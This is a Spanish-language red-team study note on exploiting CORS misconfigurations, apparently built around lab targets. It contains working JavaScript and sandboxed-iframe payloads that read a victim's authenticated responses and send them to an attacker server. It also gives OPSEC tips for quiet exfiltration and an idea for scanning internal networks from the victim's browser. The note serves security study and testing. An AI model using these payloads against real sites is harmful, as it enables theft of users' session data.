---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - CORS
  - CSRF
Descripción: "Una CORS misconfiguration concede a un origen atacante una excepción a la Same-Origin Policy"
Fecha de actualización: 2026-06-08
Nota previa: "[[02 - Same-Origin Policy y CORS]]"
Nota siguiente: "[[04 - Bypass de tokens CSRF vía CORS]]"
Area: "[[CSRF.base|CSRF]]"
---
---

Una `CORS misconfiguration` concede a un origen atacante una excepción a la [[02 - Same-Origin Policy y CORS|Same-Origin Policy]]. <mark style="background: #FFB86CA6;">El resultado es más grave que un CSRF: además de enviar peticiones autenticadas, el atacante puede **leer** la respuesta y exfiltrar datos sensibles de la sesión de la víctima</mark>. La mayoría de estos ataques requieren `Access-Control-Allow-Credentials: true`; sin él, solo son explotables aplicaciones internas sin autenticación.

# Detección: el test base

<mark style="background: #FF5582A6;">Toda caza de CORS misconfig empieza igual</mark>: envía la petición a Burp Repeater, cambia la cabecera `Origin` por un valor inventado (`https://thisdoesnotexist.evil.htb`) y mira la respuesta. Las dos cabeceras que importan:

```http
Access-Control-Allow-Origin: https://thisdoesnotexist.evil.htb   ← refleja tu origen → vulnerable
Access-Control-Allow-Credentials: true                            ← además, con credenciales
```

Si tu origen inventado aparece reflejado en `Access-Control-Allow-Origin` y `Access-Control-Allow-Credentials` es `true`, la aplicación es explotable. A partir de ahí, la variante concreta determina qué origen necesitas controlar.

# 1. Reflejo arbitrario del Origin

La aplicación lee el `Origin` de la petición y lo refleja tal cual en `Access-Control-Allow-Origin`. Suele venir de querer permitir varios subdominios sin mantener una whitelist. <mark style="background: #8000E1A6;">Consigue el efecto de un wildcard pero manteniendo las credenciales</mark>: el navegador rechaza `Access-Control-Allow-Origin: *` combinado con `Access-Control-Allow-Credentials: true`, pero acepta sin problema un origen concreto reflejado con credenciales — por eso reflejar el `Origin` es la vía práctica para leer respuestas autenticadas cross-origin.

Explotación: el atacante aloja en cualquier origen un payload que lee datos de la víctima y los exfiltra:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
xhr.withCredentials = true;
xhr.onload = () => {
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'https://10.10.14.144:4443/log', true);
    exfil.setRequestHeader('Content-Type', 'application/json');
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();
```

Cuando la víctima visita el payload, su navegador lee la respuesta autenticada (gracias al reflejo + credenciales) y la envía base64 al servidor del atacante.

# 2. Whitelist mal implementada

La aplicación valida el `Origin` contra una whitelist, pero el chequeo es defectuoso: comprueba **prefijo** o **sufijo** en lugar del origen completo. Si valida que el origen *termina* en `cors-misconfigs.htb`, el atacante registra `https://attackercors-misconfigs.htb` y pasa el filtro. Si valida que *empieza* por la cadena confiable, sirve `https://cors-misconfigs.htb.evil.htb`. <mark style="background: #FFB8EBA6;">El payload de exfiltración es idéntico al anterior; solo cambia el origen donde lo alojas</mark> — uno que satisfaga el chequeo defectuoso.

# 3. Confianza en el origin `null`

`Access-Control-Allow-Origin: null` se ve cuando alguien malinterpreta el significado del *null origin*. Detección: busca el valor `null` en la cabecera ACAO. <mark style="background: #FFB86CA6;">Cualquier atacante puede **forzar** un origin `null`</mark> con un iframe en sandbox que cargue el payload desde un `data:` URI:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://10.10.14.144:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
</script>"></iframe>
```

El contexto sandbox produce un origen `null` en la petición, que la aplicación confía.

# 4. Apuntar a la red interna

Aun **sin** `Access-Control-Allow-Credentials`, una API interna sin autenticación con `Access-Control-Allow-Origin: *` es exfiltrable si la víctima está en la misma red. Aquí el wildcard `*` sí basta —y es lo normal en APIs internas— precisamente porque renunciamos a las cookies: el veto del navegador a `*` solo aplica cuando la petición lleva credenciales. El payload (sin `withCredentials`, porque no hay sesión) hace que el navegador de la víctima —que sí alcanza la IP interna— lea y exfiltre la respuesta:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://172.16.0.2/data.php', true);   // API interna
xhr.onload = () => { location = 'https://10.10.14.144:4443/log?d=' + btoa(xhr.responseText); };
xhr.send();
```

El atacante ni siquiera necesita conocer la IP: el payload puede **escanear** la red interna probando combinaciones de IP y puerto desde el navegador de la víctima.

> [!warning]+ 🔴 Local Network Access rompe este ataque en Chrome actual
> El ataque a la red interna asume que un navegador deja que una web pública contacte `192.168.x.x`/`127.0.0.1` en silencio. **Ya no.** Lo que empezó como `Private Network Access` (preflights público→privado) es hoy `Local Network Access` (LNA), lanzado en **Chrome 142** (oct 2025): <mark style="background: #FF5582A6;">cualquier petición de un sitio público a una IP privada, *loopback* o dominio `.local` dispara un **prompt de permiso** que la víctima debe aceptar</mark> — y en Chrome 147 se extendió a WebSocket/WebTransport. En un engagement real contra Chrome moderno, asume que estos ataques internos requieren interacción de la víctima o un contexto que ya tenga el permiso; no son el ataque silencioso que describe el material original. La técnica sigue siendo válida contra navegadores antiguos, apps Electron desactualizadas o cuando el permiso ya está concedido.

> [!warning]+ OPSEC: no exfiltres con `location`
> El ejemplo de arriba usa `location = ...` por brevedad, pero provoca una redirección visible. En un ataque real, exfiltra en segundo plano con `fetch`/`XMLHttpRequest` (ver [[00 - Primitivas y entorno de explotación]]); además, un `GET` con los datos en la URL choca con el límite de longitud para respuestas grandes.

# Herramientas

La detección manual en Repeater es fiable, pero a escala conviene automatizar: `Corsy` y `CORScanner` prueban las misconfiguraciones típicas (reflejo, null, prefijo/sufijo) sobre una lista de URLs. El detalle de su uso está en [[07 - Herramientas para CSRF y CORS]].

Si la misconfiguración permite leer respuestas autenticadas, podemos ir más allá de exfiltrar datos: leer un token CSRF válido y usarlo para completar un ataque CSRF que la protección por tokens debería haber impedido — [[04 - Bypass de tokens CSRF vía CORS]].

> [!info]+ Fuentes de referencia
> - [Chrome for Developers — Local Network Access](https://developer.chrome.com/blog/local-network-access) y [PNA preflights](https://developer.chrome.com/blog/private-network-access-preflight)
> - [PortSwigger — CORS misconfigurations](https://portswigger.net/web-security/cors)
> - [PayloadsAllTheThings — CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md)
